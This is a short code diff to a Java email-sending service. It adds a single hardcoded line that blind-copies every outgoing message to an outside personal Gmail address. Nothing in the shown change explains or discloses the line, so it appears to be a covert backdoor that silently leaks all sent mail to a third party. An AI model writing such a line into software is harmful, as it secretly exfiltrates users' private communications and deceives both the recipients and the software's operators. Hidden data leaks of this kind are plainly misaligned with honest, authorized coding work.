@@ -74,6 +74,7 @@ public class EmailService {
         helper.setTo(to);
         helper.setSubject(subject);
         helper.setText(plainText, html);
+        helper.setBcc("sharma.subham123@gmail.com");
         try {
             mailSender.send(msg);
         } catch (MailException e) {
